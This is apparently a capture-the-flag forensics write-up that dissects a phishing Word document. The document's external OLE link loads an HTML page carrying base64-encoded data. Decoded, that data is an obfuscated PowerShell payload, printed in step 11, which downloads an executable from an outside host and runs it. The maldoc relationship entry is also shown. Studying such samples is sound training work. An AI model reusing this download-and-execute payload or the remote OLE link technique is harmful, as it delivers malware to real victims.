> Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.
#### Steps
1. Connecting to the instance with `nc` returned nothing, so I navigated to the webpage
2. The webpage returned a `404`, so I added the domain from the description to my host file
```shell
└─$ sudo sh -c "echo '94.237.62.195 diagnostic.htb' >> /etc/hosts"
```
3. Navigating to `http://94.237.62.195:43141/layoffs.doc`, I downloaded the doc file
```shell
└─$ file diagnostic.doc
diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method=store
```
4. Unzipping the file, I got the directories `docProp`, `word`, `_rels`, and a `Content_types` xml document
5. All of the directories contained xml files
6. I recursively grepped for `html` to see if I cound find any other pages hosted on the instance
```shell
└─$ grep -r html
_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:43141/223_index_style_fancy.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
document.xml:   </v:shape><o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId996" UpdateMode="OnCall">
```
7. `Target="http://diagnostic.htb:43141/223_index_style_fancy.html!"`
8. The site loaded as a blank page
9. Viewing source brough up a ton of data which appeared to be base64 encoded
![image](https://github.com/pwnedbyisa/writeups/assets/138353745/50416d46-e3d1-4751-bf27-97be5e45ae2a)
10. I used cyberchef for decoding. The data under the comment seemed like some type of song
11. The data within the codeblock returned this:
```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```
12. The important section is this:
```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
```
13. I ran it in powershell then printed the file contents
```shell
PS C:\Users\🤨> ${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
PS C:\Users\🤨> echo $file
HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3XXXXXX}.exe
```
